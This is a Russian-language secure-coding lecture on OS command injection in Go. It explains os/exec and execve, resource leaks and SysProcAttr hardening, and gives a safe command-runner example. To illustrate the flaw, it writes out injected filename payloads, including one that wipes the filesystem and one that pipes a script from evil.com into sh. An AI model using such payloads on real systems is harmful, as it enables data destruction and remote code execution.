## Архитектура уязвимости: когда интерфейс ОС становится вектором атаки

В процессе эволюции бэкенд-сервиса неизбежно наступает момент, когда встроенных библиотек языка становится недостаточно. Серверу требуется сконвертировать медиафайл через `ffmpeg`, проверить цифровую подпись через `openssl`, сгенерировать PDF через `wkhtmltopdf` или взаимодействовать с локальной утилитой ядра Linux.

Именно на этой границе между рантаймом языка программирования и интерфейсом операционной системы возникает уязвимость **Command Injection (Инъекция команд ОС)**.

Она проявляется в том случае, когда непроверенные пользовательские данные конкатенируются в строку системной команды и передаются интерпретатору оболочки (shell). В отличие от SQL-инъекций, замкнутых рамками движка базы данных, инъекция команд происходит непосредственно в пространстве процессов операционной системы. Злоумышленник получает возможность выполнять произвольный машинный код с правами системного пользователя, под которым работает сервер (традиционно `www-data` или `app-user`), что в большинстве случаев равносильно полному захвату хоста или контейнера.

### Ошибочное наследие классических языков

В классических экосистемах C, Perl и PHP исторически доминировали функции `system()`, `exec()` и `shell_exec()`. По умолчанию они передают переданную строку системному шеллу `/bin/sh -c "строка"`. Для интерпретатора команд строка не является единым значением: шелл производит ее лексический разбор, раскрывает переменные окружения, обрабатывает конвейеры (pipes) `|`, логические цепочки `&&`, разделители `;` и подстановки выражений в обратных кавычках `` ` ``. Стоит разработчику наивно вставить в строку параметр `$filename`, как атакующий передает `test.png; rm -rf /` или `test.png && curl evil.com/backdoor.sh | sh`.

### Философия Go: отказ от неявной оболочки

Язык Go создавался ветеранами Bell Labs и создателями Unix. Поэтому пакет `os/exec` спроектирован с глубоким пониманием безопасности системных вызовов ядра: **по умолчанию Go никогда не вызывает командную оболочку**.

Функция `exec.Command` обращается напрямую к низкоуровневому интерфейсу ядра через системный вызов `execve`, передавая путь к исполняемому бинарнику и его аргументы в виде строгого вектора строк `argv[]`. На уровне системного вызова ядра символы `;`, `|`, `&` и пробелы теряют свою магическую силу и воспринимаются исключительно как байты аргумента. Уязвимость Command Injection в Go возникает исключительно тогда, когда разработчик сам намеренно или по незнанию вызывает шелл через `exec.Command("sh", "-c", rawString)`.

```mermaid
flowchart TD
    subgraph App["Go Application (Безопасный путь по умолчанию)"]
        A["Go приложение"] --> B["os/exec.Command"]
        B --> C["Формирование argv массива"]
        C --> D["Системный вызов clone / fork"]
        D --> E["Дочерний процесс"]
        E --> F["execve бинарник + аргументы"]
        F --> G["Выполнение команды"]
    end

    subgraph Unsafe["Небезопасный путь (Вызов оболочки)"]
        H["Небезопасный путь"] -->|"sh -c строка"| I["Интерпретация метасимволов"]
        I --> J["Инъекция и выполнение произвольного кода"]
    end

    style B fill:#1e293b,stroke:#38bdf8,stroke-width:2px,color:#f8fafc
    style G fill:#1e293b,stroke:#10b981,stroke-width:2px,color:#f8fafc
    style H fill:#1e293b,stroke:#f43f5e,stroke-width:2px,color:#f8fafc
    style J fill:#1e293b,stroke:#f43f5e,stroke-width:2px,color:#f8fafc
```



---

## Под капотом `os/exec`: `fork`, `execve` и вектор аргументов

Чтобы осознанно писать безопасный и быстрый код, разберем путь, который проходит рантайм Go при выполнении команды `exec.Command("ls", "-l", "/tmp")`:

1. **Сборка структуры `exec.Cmd`:**  
   Рантайм инициализирует дескриптор команды. Поле `Path` получает путь к бинарнику, а поле `Args` — слайс строк `[]string{"ls", "-l", "/tmp"}`. Обратите внимание: первый элемент `Args[0]` традиционно повторяет имя команды (для соглашений POSIX).
2. **Подготовка окружения:**  
   Формируются переменные окружения `Env`, рабочий каталог процесса `Dir`, а также связываются стандартные потоки `Stdin/Stdout/Stderr` (через анонимные каналы `os.Pipe`).
3. **Создание процесса (`clone` / `fork`):**  
   В Linux рантайм Go не использует тяжелый `fork()` из libc. Вместо этого вызывается ассемблерная функция `runtime.fork/exec`, которая выполняет системный вызов `clone` с флагами `CLONE_VFORK | CLONE_VM` (или оптимизированный аналог `vfork`). Это позволяет создать дочернюю задачу `task_struct` без дорогостоящего поэлементного дублирования таблиц страниц памяти родительского процесса.
4. **Подмена образа памяти (`syscall.Exec` / `execve`):**  
   Новорожденный дочерний процесс вызывает `syscall.Exec`. Ядро Linux сбрасывает адресное пространство процесса, читает ELF-заголовки исполняемого файла, проецирует сегменты `.text` и `.data` в виртуальную память, закрывает файловые дескрипторы, помеченные флагом `FD_CLOEXEC`, и передает управление точке входа (`_start`).
5. **Ожидание и сбор статуса (`wait4`):**  
   Родительский процесс (горутина Go) переводит системный поток в ожидание завершения дочернего процесса через системный вызов `wait4`.

Ключевой вывод для безопасности: ядро Linux на системном вызове `execve` принципиально **не парсит** аргументы как командную строку! Оно принимает плоский массив указателей на нуль-терминированные строки `argv[]`. Строка `"; rm -rf /"` будет передана утилите `ls` как буквальное имя файла. Если файла с таким именем нет на диске, `ls` просто выведет ошибку в stderr.

---

## Механическое сочувствие: цена создания процесса и утечка ресурсов

Запуск внешнего бинарника — одна из самых дорогостоящих операций в серверном программировании:

- **Контекстные переключения и планировщик:**  
  Системный вызов `clone`/`execve` переключает контекст процессора, сбрасывает аппаратный буфер ассоциативной трансляции (TLB) и заставляет ядро аллоцировать внутренние структуры дескрипторов. В Go выполнение блокирующего системного вызова блокирует физический тред ОС (`M`). Если число параллельных запусков велико, планировщик Go вынужден создавать новые треды ОС, увеличивая накладные расходы на переключение контекстов и синхронизацию пула тредов.
- **Утечка файловых дескрипторов (File Descriptor Leak):**  
  По умолчанию в Unix дочерний процесс наследует открытые файловые дескрипторы родителя. Если ваш Go-сервер удерживает соединения с PostgreSQL, Redis, сетевые сокеты `netpoll` и открытые дескрипторы лог-файлов, дочерний процесс получает их неявную копию. Это приводит к:
  - Зависанию соединений с БД (сокет не закрывается на стороне сервера, так как дочерний процесс держит его открытым).
  - Превышению системного лимита открытых файлов `ulimit -n`.
  - Утечке конфиденциального сетевого трафика через каталог `/proc/<pid>/fd`.
- **Процессы-зомби (Zombie Processes):**  
  Когда дочерний процесс завершает работу, ядро сохраняет код его возврата в таблице процессов до тех пор, пока родитель не вызовет `wait4`. Если вызвать `cmd.Start()` и забыть вызвать `cmd.Wait()`, процесс навсегда зависает в состоянии `Z` (Zombie). При активном трафике таблица PID ядра переполняется, и ОС отказывается создавать любые новые процессы. Высокоуровневые методы `cmd.Run()`, `cmd.Output()` и `cmd.CombinedOutput()` гарантируют вызов `Wait()`.

---

> [!info] Под капотом: Почему SysProcAttr критичен для безопасности?
> **Изоляция на уровне ядра через `syscall.SysProcAttr`:**  
> В Go низкоуровневые параметры системного вызова `clone`/`execve` настраиваются через структуру `syscall.SysProcAttr`:
> - `NoNewPrivileges: true` — активирует флаг ядра Linux `PR_SET_NO_NEW_PRIVS`. Он гарантирует, что ни дочерний процесс, ни его потомки никогда не смогут повысить свои привилегии через файлы с битами `setuid`/`setgid` (например, через уязвимости в `sudo` или `pkexec`).
> - `Setpgid: true` — запускает дочерний процесс в отдельной группе процессов (Process Group). Это позволяет послать сигнал `SIGTERM` или `SIGKILL` всему дереву процессов одновременно, исключая появление процессов-сирот.
> - `Pdeathsig: syscall.SIGTERM` — указывает ядру Linux автоматически отправить сигнал `SIGTERM` дочернему процессу в момент смерти родительского Go-процесса.

---

## Идиоматичная защита в Go

Архитектурно правильное выполнение внешних команд опирается на три фундаментальных правила:
1. Использование вектора `argv[]` без промежуточных шеллов.
2. Контроль времени исполнения через `context.WithTimeout`.
3. Очистка переменных окружения и изоляция прав через `SysProcAttr`.

```go
package cmdsec

import (
	"context"
	"fmt"
	"os/exec"
	"syscall"
	"time"
)

// SafeRunCommand безопасно выполняет внешнюю утилиту с изоляцией прав и строгими таймаутами
func SafeRunCommand(ctx context.Context, binary string, args []string, input []byte) ([]byte, error) {
	// 1 - Жёсткий таймаут: при истечении контекста процесс принудительно завершается
	ctxWithTimeout, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	// 2 - 🔒 Явная передача бинарника и аргументов без вызова "sh -c"
	cmd := exec.CommandContext(ctxWithTimeout, binary, args...)

	// 3 - 🔒 Минимизация окружения: исключаем утечку AWS_SECRET_KEY, токенов и PATH
	cmd.Env = []string{
		"PATH=/usr/local/bin:/usr/bin",
		"LC_ALL=C",
	}
	// Ограничиваем рабочий каталог процесса изолированной временной папкой
	cmd.Dir = "/tmp"

	// 4 - 🔒 Изоляция на уровне ядра Linux через SysProcAttr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		// Блокировка повышения привилегий через setuid/setgid бинарники
		NoNewPrivileges: true,
		// Гарантия уничтожения потомка при аварийной смерти родителя
		Pdeathsig: syscall.SIGTERM,
		// Выделение собственной группы процессов для управления сигналами
		Setpgid: true,
	}

	// 5 - Передача данных через стандартный ввод (pipe), если требуется
	cmd.Stdin = nil // Входных данных нет; для безопасности указываем явно

	// CombinedOutput автоматически собирает Stdout и Stderr и вызывает Wait()
	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctxWithTimeout.Err() != nil {
			return nil, fmt.Errorf("command timed out or cancelled: %w", ctxWithTimeout.Err())
		}
		return output, fmt.Errorf("command execution failed: %w", err)
	}

	return output, nil
}
```

---

## Ловушки и подводные камни (Gotchas)

1. **Обход путей через переменную `PATH`:**  
   Если в `exec.Command` передать относительное имя утилиты (например, `"convert"` вместо `"/usr/bin/convert"`), рантайм Go начнет последовательно искать бинарник по каталогам из `PATH`. Если текущий рабочий каталог или каталог с ненадежными файлами окажется в `PATH`, приложение выполнит вредоносный бинарник с тем же именем. **Решение:** Всегда указывайте абсолютный канонический путь к исполняемому файлу (`/usr/bin/convert`).
2. **Утечка стандартных потоков `stdout` и `stderr`:**  
   Если поля `cmd.Stdout` и `cmd.Stderr` не инициализированы, дочерний процесс может унаследовать дескрипторы родительского процесса, перемешивая свой вывод с JSON-логами вашего микросервиса. **Решение:** Всегда перенаправляйте вывод в буфер (`bytes.Buffer`), отбрасывайте (`io.Discard`) или используйте `cmd.CombinedOutput()`.
3. **Инъекции через переменные окружения:**  
   Если вы динамически добавляете переменные в `cmd.Env` на основе пользовательского ввода (например, язык интерфейса или тему), злоумышленник может внедрить управляющие переменные компоновщика и рантаймов: `LD_PRELOAD` (для подгрузки вредоносной shared-библиотеки в Linux), `PYTHONPATH` или `NODE_OPTIONS`. **Решение:** Переменные окружения должны фильтроваться по строгому белому списку (allowlist).

---

> [!warning] Ловушка / Gotcha: Почему нельзя санитизировать аргументы команд вручную?
> **Опасность ручного экранирования спецсимволов:**  
> Попытки реализовать собственную фильтрацию команд через `strings.Replace` или `regexp` (`escapeshellarg`) регулярно приводят к катастрофическим уязвимостям. Разнообразие кодировок, пробельные разделители (табуляции, IFS), null-байты и специфика парсинга разных версий шеллов делают надежное строковое экранирование практически невозможным.  
> В Go эта проблема решена на уровне архитектуры: передавая аргументы как отдельные элементы слайса `argv[]`, вы физически исключаете этап разбора строки оболочкой. **Экранирование не требуется вовсе, если вы не используете `sh -c`.**

---

> [!tip] Собеседование
> **Вопрос:** «Что произойдет с запущенным дочерним процессом, если родительский сервис на Go внезапно упадет в результате паники (`panic`) или будет убит операционной системой по Out of Memory (OOM Killer)? Как на 100% гарантировать очистку процессов в Linux?»  
> 
> **Ответ кандидата Senior-уровня:**  
> «1. **Процессы-сироты:** По умолчанию в Unix/Linux при внезапной гибели родителя дочерний процесс становится "сиротой" (orphan) и переподчиняется корневому процессу инициализации системы (PID 1 / systemd). Он продолжает бесконтрольно работать и потреблять память и процессорное время.  
> 2. **Системный флаг `Pdeathsig`:** В Go эта проблема решается настройкой `syscall.SysProcAttr{Pdeathsig: syscall.SIGTERM}` (или `SIGKILL`). При падении родителя ядро Linux вызывает механизм `prctl(PR_SET_PDEATHSIG)` и автоматически направляет указанный сигнал дочернему процессу.  
> 3. **Группы процессов и изоляция:** Дополнительно рекомендуется выставлять `Setpgid: true` для изоляции группы процессов. В контейнерных окружениях (Docker / Kubernetes) хорошей практикой является запуск процессов в отдельных `cgroup` или использование легковесного init-процесса (например, `tini`), корректно утилизирующего зомби и сироты.  
> 4. **Уровень Go-кода:** Всегда оборачивать запуск в `exec.CommandContext` с `defer cancel()`, чтобы даже штатное завершение HTTP-хендлера отменяло дочернюю задачу».

---

## Итог

1. **Безопасность по умолчанию:** Пакет `os/exec` в Go безопасен из коробки, так как обращается к ядру через системный вызов `execve` и вектор аргументов `argv[]`. Уязвимость Command Injection возникает только при намеренном запуске командного интерпретатора (`sh -c` или `bash -c`).
2. **Механическое сочувствие к ОС:** Создание дочернего процесса через `clone`/`fork` и `execve` — тяжелая операция. Она блокирует системный тред (`M`), вызывает сброс TLB и создает нагрузку на планировщик. Неконтролируемый запуск внешних утилит способен парализовать сервер.
3. **Предотвращение утечек ресурсов:** Наследование файловых дескрипторов и переменных окружения несет серьезные риски безопасности. Контролируйте `cmd.Env`, используйте абсолютные пути к бинарникам и всегда вызывайте `cmd.Wait()` для исключения зомби-процессов.
4. **Управление жизненным циклом:** Атрибуты `Pdeathsig`, `Setpgid` и `NoNewPrivileges` в `syscall.SysProcAttr` обеспечивают надежную изоляцию и гарантируют уничтожение дочерних процессов при авариях родителя.
5. **Отказ от кастомного экранирования:** Никогда не пытайтесь экранировать строки команд регулярными выражениями. Передавайте аргументы изолированными элементами слайса.

Как защитить файловую систему сервера от несанкционированного чтения и перезаписи конфигурационных файлов через манипуляции с путями?  
В следующей лекции мы детально изучим: [[5. Path traversal]].